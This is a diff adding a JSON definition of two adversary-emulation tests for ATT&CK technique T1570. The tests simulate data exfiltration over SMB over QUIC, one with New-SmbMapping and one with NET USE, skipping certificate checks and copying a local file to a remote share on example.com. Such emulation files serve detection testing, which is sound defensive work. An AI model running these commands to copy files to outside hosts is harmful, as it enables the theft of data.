@@ -1,0 +1,60 @@
+{
+  "attack_technique": "T1570",
+  "display_name": "Lateral Tool Transfer",
+  "atomic_tests": [
+    {
+      "name": "Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "procedure": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "remote_path",
+          "description": "The UNC path to the share on the file server",
+          "type": "string",
+          "default": "\\\\example.com\\sales"
+        },
+        {
+          "arg_name": "local_file",
+          "description": "The local file to be transferred",
+          "type": "path",
+          "default": "C:\\path\\to\\file.txt"
+        }
+      ],
+      "auto_generated_guid": "d8d13303-159e-4f33-89f4-9f07812d016f"
+    },
+    {
+      "name": "Exfiltration Over SMB over QUIC (NET USE)",
+      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "procedure": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "remote_path",
+          "description": "The UNC path to the share on the file server",
+          "type": "string",
+          "default": "\\\\example.com\\sales"
+        },
+        {
+          "arg_name": "local_file",
+          "description": "The local file to be transferred",
+          "type": "path",
+          "default": "C:\\path\\to\\file.txt"
+        }
+      ],
+      "auto_generated_guid": "183235ca-8e6c-422c-88c2-3aa28c4825d9"
+    }
+  ]
+}
